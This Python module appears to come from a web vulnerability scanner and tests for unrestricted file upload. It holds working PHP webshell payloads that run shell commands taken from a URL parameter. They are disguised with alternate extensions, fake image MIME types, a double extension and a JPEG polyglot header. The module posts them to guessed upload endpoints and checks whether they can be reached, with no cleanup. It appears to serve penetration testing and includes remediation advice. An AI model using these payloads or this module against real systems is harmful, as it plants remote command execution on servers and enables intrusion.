import re
from modules.base import BaseModule


class UploadModule(BaseModule):
    NAME = "upload"
    DESCRIPTION = "File upload testing - unrestricted upload, content-type bypass"

    UPLOAD_PATHS = ["/upload", "/upload.php", "/file/upload",
                    "/api/upload", "/admin/upload", "/media/upload"]

    BYPASS_FILES = [
        ("webshell.php",   b"<?php system($_GET['cmd']); ?>",      "application/x-php"),
        ("webshell.php5",  b"<?php system($_GET['cmd']); ?>",      "image/jpeg"),
        ("webshell.phtml", b"<?php system($_GET['cmd']); ?>",      "image/png"),
        ("shell.php.jpg",  b"<?php system($_GET['cmd']); ?>",      "image/jpeg"),
        ("polyglot.php",   b"\xff\xd8\xff<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ]

    def run(self):
        self.log.info("[upload] Testing for unrestricted file upload")
        upload_url = self._find_upload()
        if not upload_url:
            return
        self._test_uploads(upload_url)

    def _find_upload(self):
        for path in self.UPLOAD_PATHS:
            r = self.get(path)
            if r and r.status_code == 200 and re.search(
                r'<input[^>]+type=["\']file["\']', r.text, re.I
            ):
                return self.url(path)
        return None

    def _test_uploads(self, upload_url: str):
        for fname, content, mime in self.BYPASS_FILES:
            files = {"file": (fname, content, mime)}
            r = self.session.post(
                upload_url, files=files,
                timeout=self.settings.timeout,
                proxies=self.settings.proxies(),
                verify=False,
            )
            if r and r.status_code in (200, 201, 302):
                for guess_path in [f"/uploads/{fname}", f"/media/{fname}", f"/files/{fname}"]:
                    check = self.get(guess_path)
                    if check and check.status_code == 200:
                        self.add_finding(
                            severity="CRITICAL",
                            title="Unrestricted file upload - webshell uploaded",
                            url=self.url(guess_path),
                            detail=f"File '{fname}' accepted and accessible.",
                            payload=fname,
                            evidence=f"Upload URL: {upload_url}\nFile URL: {self.url(guess_path)}",
                            remediation=(
                                "Validate file type server-side (magic bytes + allowlist). "
                                "Store uploads outside webroot. Rename files."
                            ),
                        )
